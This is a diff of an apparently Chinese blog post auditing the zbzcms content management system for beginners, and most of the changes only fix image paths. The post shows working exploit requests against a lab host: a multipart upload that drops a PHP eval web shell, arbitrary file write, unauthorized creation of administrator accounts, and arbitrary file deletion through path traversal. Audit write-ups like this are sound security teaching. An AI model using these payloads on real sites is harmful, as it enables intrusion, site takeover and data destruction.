-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\43.png" srcset="/img/loading.gif" lazyload alt="43"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/43.png" srcset="/img/loading.gif" lazyload alt="43"></p>
 <p>也是成功写入</p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\44.png" srcset="/img/loading.gif" lazyload alt="44"></p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\45.png" srcset="/img/loading.gif" lazyload alt="45"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/44.png" srcset="/img/loading.gif" lazyload alt="44"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/45.png" srcset="/img/loading.gif" lazyload alt="45"></p>
 <h4 id="文件上传4"><a href="#文件上传4" class="headerlink" title="文件上传4"></a>文件上传4</h4><p>在另一个路径下<a target="_blank" rel="noopener" href="http://192.168.1.7/zbzcms.com/cms/cms/zbzedit/php/zbz.php">http://192.168.1.7/zbzcms.com/cms/cms/zbzedit/php/zbz.php</a><br>我们来看代码</p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\46.png" srcset="/img/loading.gif" lazyload alt="46"></p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\47.png" srcset="/img/loading.gif" lazyload alt="47"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/46.png" srcset="/img/loading.gif" lazyload alt="46"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/47.png" srcset="/img/loading.gif" lazyload alt="47"></p>
 <p>进行了一些花里胡哨的操作 主要的问题 还是没有任何过滤和限制<br>通过path和path_res控制路径<br>data_pic_name 控制文件名0改名1不改<br>然后就是上传了<br>那就直接构造</p>
 <blockquote>
 <p>payload：<br>POST /zbzcms.com/cms/cms/zbzedit/php/zbz.php?run=uptxt&amp;path=../../../upload/up/&amp;path_res=../../upload/up/&amp;data_pic_name=1 HTTP/1.1<br>Host: 192.168.1.7<br>Content-Length: 238<br>Accept: application/json, text/javascript, <em>/</em>; q=0.01<br>X-Requested-With: XMLHttpRequest<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36<br>Content-Type: multipart/form-data; boundary=——WebKitFormBoundaryQy3ayf3rnYVYcEcG<br>Origin: <a target="_blank" rel="noopener" href="http://192.168.1.7/">http://192.168.1.7</a><br>Referer: <a target="_blank" rel="noopener" href="http://192.168.1.7/zbzcms.com/cms/cms/zbzedit/edit.html">http://192.168.1.7/zbzcms.com/cms/cms/zbzedit/edit.html</a><br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9,is;q=0.8,zh-TW;q=0.7<br>Cookie: PHPSESSID=utnoq283ip9p4fuu5dfm56qmo5<br>Connection: close</p>
@@ -386,60 +386,60 @@
 <blockquote>
 <p>herman<br><?php [@eval](https://github.com/eval)($_POST[‘a’]); phpinfo();?><br>-——-WebKitFormBoundaryQy3ayf3rnYVYcEcG—</p>
 </blockquote>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\48.png" srcset="/img/loading.gif" lazyload alt="48"></p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\49.png" srcset="/img/loading.gif" lazyload alt="49"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/48.png" srcset="/img/loading.gif" lazyload alt="48"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/49.png" srcset="/img/loading.gif" lazyload alt="49"></p>
 <p>成功上传</p>
 <h3 id="第五处-任意文件写入"><a href="#第五处-任意文件写入" class="headerlink" title="第五处 任意文件写入"></a>第五处 任意文件写入</h3><p>本来这个是在看上传的 结果看到 一个文件保存的地方 存在一个经典的文件写入函数file_put_contents<br>然后就分析了一波 发现是存在任意文件写入的</p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\50.png" srcset="/img/loading.gif" lazyload alt="50"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/50.png" srcset="/img/loading.gif" lazyload alt="50"></p>
 <p>这里首先是判断的run参数 然后获取post传参的值 然后判断魔术引号那个设置是否开启 相当于放注入一些转义的功能<br>如果开启 在用stripslashes() 函数把反斜杠删去<br>然后下面就直接写入了<br>当时这个文件是在admin目录下 相当于后台的 但是通过上面的权限控制发现 可以直接绕过 这登录判断相当于就没有<br>我们来看上面判断登录的代码</p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\51.png" srcset="/img/loading.gif" lazyload alt="51"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/51.png" srcset="/img/loading.gif" lazyload alt="51"></p>
 <p>通过run参数的值来判断 这不搞笑嘛 run不等于这个值不久 直接不判断了 直接执行下面的<br>好了 现在来构造payload：</p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\52.png" srcset="/img/loading.gif" lazyload alt="52"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/52.png" srcset="/img/loading.gif" lazyload alt="52"></p>
 <p>执行之后</p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\53.png" srcset="/img/loading.gif" lazyload alt="53"></p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\54.png" srcset="/img/loading.gif" lazyload alt="54"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/53.png" srcset="/img/loading.gif" lazyload alt="53"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/54.png" srcset="/img/loading.gif" lazyload alt="54"></p>
 <p>也是成功的写入 以及访问到<br>如果get_magic_quotes_gpc()函数开启的话 写马就需要用没有引号的马子</p>
 <h3 id="第六处-未授权任意管理员添加"><a href="#第六处-未授权任意管理员添加" class="headerlink" title="第六处 未授权任意管理员添加"></a>第六处 未授权任意管理员添加</h3><p>还是这个文件<br>有一个add 操作 没有指定表</p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\55.png" srcset="/img/loading.gif" lazyload alt="55"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/55.png" srcset="/img/loading.gif" lazyload alt="55"></p>
 <p>可直接任意指定表 我们往admin表添加一个用户<br>构造payload</p>
 <p>这里post参数就是根据数据库的字段来填的</p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\56.png" srcset="/img/loading.gif" lazyload alt="56"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/56.png" srcset="/img/loading.gif" lazyload alt="56"></p>
 <p>执行之后</p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\57.png" srcset="/img/loading.gif" lazyload alt="57"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/57.png" srcset="/img/loading.gif" lazyload alt="57"></p>
 <p>也是成功的添加进来<br>未授权删除 修改</p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\58.png" srcset="/img/loading.gif" lazyload alt="58"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/58.png" srcset="/img/loading.gif" lazyload alt="58"></p>
 <p>逻辑都一样</p>
-<h3 id="第七处-任意文件删除"><a href="#第七处-任意文件删除" class="headerlink" title="第七处 任意文件删除"></a>第七处 任意文件删除</h3><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\59.png" srcset="/img/loading.gif" lazyload alt="59"></p>
+<h3 id="第七处-任意文件删除"><a href="#第七处-任意文件删除" class="headerlink" title="第七处 任意文件删除"></a>第七处 任意文件删除</h3><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/59.png" srcset="/img/loading.gif" lazyload alt="59"></p>
 <p>这里延续上面的文件上传3的 upload文件</p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\60.png" srcset="/img/loading.gif" lazyload alt="60"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/60.png" srcset="/img/loading.gif" lazyload alt="60"></p>
 <p>这里存在if else判断 没进入上传的条件的话 就执行下面的删除操作<br>也是没有任何过滤 直接通过传参del跟上路径 直接任意删除 我们先在目录下创建一个1.txt</p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\61.png" srcset="/img/loading.gif" lazyload alt="61"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/61.png" srcset="/img/loading.gif" lazyload alt="61"></p>
 <p>在上一级目录下创建 然后我们构造payload 删除<br><a target="_blank" rel="noopener" href="http://192.168.1.7/zbzcms.com/cms/cms/include/upload.php?del=../1.txt">http://192.168.1.7/zbzcms.com/cms/cms/include/upload.php?del=../1.txt</a></p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\62.png" srcset="/img/loading.gif" lazyload alt="62"></p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\63.png" srcset="/img/loading.gif" lazyload alt="63"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/62.png" srcset="/img/loading.gif" lazyload alt="62"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/63.png" srcset="/img/loading.gif" lazyload alt="63"></p>
 <p>也是成功删除</p>
-<h3 id="第八处-未授权添加管理员"><a href="#第八处-未授权添加管理员" class="headerlink" title="第八处 未授权添加管理员"></a>第八处 未授权添加管理员</h3><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\64.png" srcset="/img/loading.gif" lazyload alt="64"></p>
+<h3 id="第八处-未授权添加管理员"><a href="#第八处-未授权添加管理员" class="headerlink" title="第八处 未授权添加管理员"></a>第八处 未授权添加管理员</h3><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/64.png" srcset="/img/loading.gif" lazyload alt="64"></p>
 <p>问题出现在这个文件 这个文件夹前面我们也分析过 这里漏了一个管理员添加<br>也是直接构造run参数 未授权添加</p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\65.png" srcset="/img/loading.gif" lazyload alt="65"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/65.png" srcset="/img/loading.gif" lazyload alt="65"></p>
 <p>然后查看数据库</p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\66.png" srcset="/img/loading.gif" lazyload alt="66"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/66.png" srcset="/img/loading.gif" lazyload alt="66"></p>
 <p>但是发现这个时候 是没有等级的 相当于权限 也就等不进去</p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\67.png" srcset="/img/loading.gif" lazyload alt="67"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/67.png" srcset="/img/loading.gif" lazyload alt="67"></p>
 <p>但是这个文件前面有一个判断是判断是否登录的</p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\68.png" srcset="/img/loading.gif" lazyload alt="68"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/68.png" srcset="/img/loading.gif" lazyload alt="68"></p>
 <p>我们先通过login 来得到session<br>直接构造</p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\69.png" srcset="/img/loading.gif" lazyload alt="69"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/69.png" srcset="/img/loading.gif" lazyload alt="69"></p>
 <p>注意 这里是pwd</p>
 <p>执行之后</p>
 <p>然后将这个路径<a target="_blank" rel="noopener" href="http://192.168.1.7/zbzcms.com/cms/cms/admin/%E5%A4%8D%E5%88%B6%E5%88%B0">http://192.168.1.7/zbzcms.com/cms/cms/admin/复制到</a> url<br>回车即可</p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\70.png" srcset="/img/loading.gif" lazyload alt="70"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/70.png" srcset="/img/loading.gif" lazyload alt="70"></p>
 <p>还有一种方式</p>
 <p>在添加管理员的时候 把等级参数 填上</p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\71.png" srcset="/img/loading.gif" lazyload alt="71"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/71.png" srcset="/img/loading.gif" lazyload alt="71"></p>
 <p>然后查看数据库</p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\72.png" srcset="/img/loading.gif" lazyload alt="72"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/72.png" srcset="/img/loading.gif" lazyload alt="72"></p>
 <p>刚添加的abc 权限为1<br>直接登录</p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\73.png" srcset="/img/loading.gif" lazyload alt="73"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/73.png" srcset="/img/loading.gif" lazyload alt="73"></p>
 <h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>如果有什么说的不好的地方请师傅们指出~</p>
 <p>联系方式关于页面</p>
 
